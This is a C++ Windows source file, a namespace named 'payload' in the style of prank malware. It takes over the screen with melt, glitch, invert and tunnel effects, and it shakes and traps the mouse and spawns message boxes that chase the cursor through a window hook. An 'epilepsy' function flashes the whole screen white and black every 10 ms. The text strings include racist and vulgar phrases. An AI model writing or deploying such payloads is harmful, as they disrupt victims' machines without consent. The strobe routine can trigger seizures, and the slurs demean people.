#include <wincrypt.h>
#include <Windows.h>
#include <corecrt_math_defines.h>

namespace payload {

	const char strings[][MAX_PATH] = { "my negro", "fuckerino", "pferdesalami", "papa der pc ist kaputt", "omegalul" };

	const int MOUSESHAKE = 30;

	int width, height, iconW, iconH;

	HCRYPTPROV prov;
	HDC hdc;
	HICON err, info, warn;

	POINT mouse;

	void init() {
		hdc = GetDC(0);
		width = GetSystemMetrics(0);
		height = GetSystemMetrics(1);
		iconW = GetSystemMetrics(SM_CXICON);
		iconH = GetSystemMetrics(SM_CYICON);
		err = LoadIconA(0, IDI_ERROR);
		info = LoadIconA(0, IDI_INFORMATION);
		warn = LoadIconA(0, IDI_WARNING);

		SetTextColor(hdc, RGB(255, 0, 0));
		SetBkColor(hdc, RGB(0, 0, 0));
		SetBkMode(hdc, OPAQUE);

	}

	unsigned random(unsigned maxsize) {
		if (prov == 0 && !CryptAcquireContextA(&prov, 0, 0, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT)) ExitProcess(1);

		BYTE integer[4];
		CryptGenRandom(prov, 4, integer);
		return *((unsigned*)integer) % maxsize;
	}

	bool random() { return random(2) - 1; }

	const char* randomString() {
		return strings[random(sizeof(strings) / MAX_PATH)];
	}

	void moveMouse() {
		POINT p;
		GetCursorPos(&p);
		SetCursorPos(p.x + (random(50) - 25), p.y + (random(50) - 25));
	}

	void trapMouse() {
		SetCursorPos(mouse.x, mouse.y);
	}

	void drawErrorCursor() {
		POINT p;
		GetCursorPos(&p);
		DrawIcon(hdc, p.x - iconW / 2, p.y - iconH / 2, random() ? err : (random() ? info : warn));
	}

	void melt() {
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, 500, height);
		HDC hdc2 = CreateCompatibleDC(hdc);
		SelectObject(hdc2, screenshot);

		for (int i = 0; i < 20; i++) {
			int x = random(width - 20 / 2);
			for (; x % 20 != 0; x++) {}

			BitBlt(hdc2, 0, 0, 20, height, hdc, x, 0, SRCCOPY);

			for (int j = 0; j < 20; j++) {
				int depth = sin(j / ((float)20) * M_PI) * (50);
				StretchBlt(hdc2, j, 0, 1, depth, hdc2, j, 0, 1, 1, SRCCOPY);
				BitBlt(hdc2, j, 0, 1, height, hdc2, j, -depth, SRCCOPY);
			}

			BitBlt(hdc, x, 0, 20, height, hdc2, 0, 0, SRCCOPY);
		}

		DeleteDC(hdc2);
		DeleteObject(screenshot);
	}

	void screenGlitch() {
		int seed = random(1000);
		int x1 = random(width - seed);
		int y1 = random(height - seed);
		int x2 = random(width - seed);
		int y2 = random(height - seed);
		BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCERASE);
	}

	void epilepsy() {
		BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, WHITENESS);
		Sleep(10);
		BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, BLACKNESS);
	}

	void screenInvert() { BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, NOTSRCCOPY); }

	void screenTunnel() {
		StretchBlt(hdc, 50, 50, width - 100, height - 100, hdc, 0, 0, width, height, SRCCOPY);
	}

	void drawText() {
		RECT rect = { random(width), random(height), random(width), random(height) };
		DrawTextA(hdc, randomString(), -1, &rect, DT_NOCLIP);
	}

	// snip

	LONG_PTR CALLBACK followMouseBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
		CWPRETSTRUCT* msg = (CWPRETSTRUCT*)lParam;

		if (msg->message == WM_INITDIALOG) {
			SetWindowPos(msg->hwnd, 0, mouse.x - 50, mouse.y - 50, 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
			for (int i = 1; i <= 11; i++) SetWindowTextA(GetDlgItem(msg->hwnd, i), randomString());
		}

		return CallNextHookEx(0, nCode, wParam, lParam);
	}

	void msgboxmousefollow() {
		POINT p;
		if (GetCursorPos(&p)) {
			if (p.x != mouse.x || p.y != mouse.y) {

				mouse = p;

				CreateThread(0, 0, [](void* data) -> DWORD {
					HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, followMouseBoxHook, 0, GetCurrentThreadId());
					DWORD msg = random(7) + (random(5) << 4);
					MessageBoxA(0, "mouse fucked", randomString(), msg);
					Sleep(100);
					UnhookWindowsHookEx(hook);
					return 0;
				}, 0, 0, 0);
			}
		}
	}

}